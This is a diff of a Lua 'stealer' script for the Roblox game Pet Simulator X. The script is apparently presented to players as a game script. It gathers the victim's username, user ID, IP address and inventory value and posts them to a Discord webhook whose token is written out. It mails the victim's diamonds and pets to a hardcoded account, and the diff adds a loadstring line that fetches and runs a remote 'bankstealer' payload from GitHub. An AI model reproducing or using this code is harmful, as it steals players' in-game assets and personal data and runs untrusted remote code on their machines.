@@ -17,7 +17,6 @@ for i,v in pairs(Library.Save.Get().Pets) do
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
      UserName = "TehPucuk_55"
-     UserName2 = "TehPucuk_55"
      Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
 end
 
@@ -771,6 +770,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1039,14 +1039,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":joy: **Pets left** :joy:",
+                    ["name"] = ":dog: **Pets left** :dog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1109,14 +1109,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":joy: **Pets left** :joy:",
+                    ["name"] = ":dog: **Pets left** :dog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1158,7 +1158,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://discord.gg/4y4CZfdJHu"
+        local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1256,12 +1256,11 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
-            user = dhuser
         end
     end
     local args = {
         [1] = {
-            ["Recipient"] = user,
+            ["Recipient"] = "TehPucuk_55",
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1276,12 +1275,11 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1304,12 +1302,11 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1334,12 +1331,11 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1363,12 +1359,11 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1391,12 +1386,11 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1419,12 +1413,11 @@ spawn(function()
                 user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1452,7 +1445,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1475,12 +1468,11 @@ spawn(function()
                 user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
